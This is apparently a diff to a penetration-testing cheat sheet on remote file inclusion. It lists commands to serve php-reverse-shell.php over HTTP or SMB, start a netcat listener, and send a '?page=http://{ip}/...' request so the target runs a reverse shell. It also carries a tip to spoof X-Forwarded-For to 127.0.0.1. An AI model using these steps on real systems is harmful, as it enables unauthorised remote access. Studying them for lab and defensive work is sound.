@@ -56,18 +56,17 @@
 - Try adding ``` X-Forwarded-For: 127.0.0.1 ```
 
 ## RFI
-- Least common (LFI > RFI)
+### Linux
 - Host a web server for exposing exploit php 
-  
   e.g. php-reverse-shell.php
-
   ``` python3 -m http.server 80 ```
 - open reverse shell server
-
     ``` nc -lvnp 4444 ```
 - RFI request to the website
-  
   ``` ?page=http://{ip}/php-reverse-shell.php ```
+### Windows
+- smbserver 445
+- ``` \\kali\test.php ```
 
 
 
